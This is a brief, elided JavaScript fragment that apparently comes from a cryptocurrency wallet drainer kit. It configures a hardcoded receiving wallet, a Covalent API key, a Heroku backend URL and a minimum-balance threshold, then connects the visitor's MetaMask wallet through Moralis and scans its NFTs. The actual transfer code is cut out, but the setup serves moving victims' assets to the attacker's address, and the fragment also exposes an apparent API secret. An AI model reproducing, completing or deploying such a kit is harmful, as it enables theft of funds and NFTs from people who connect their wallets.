const RECEIVER = "0x9544Cb57BF13EeaEC4e08FD31765ed10a01A2988"; // ONLY CHANGE THIS if marketing only

const COVAL_KEY = "ckey_545c9a94d81346078c2848187c7"; // use this one

const API_URL = " https://young-stream-84253.herokuapp.com"; // use your own (DONT copy the end /)

const MIN_ETH_BAL = 0.00007; // $1 
...
async function connect(name) {
  ...
  await scanNfts(account);
   ...
   await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "metamask" });
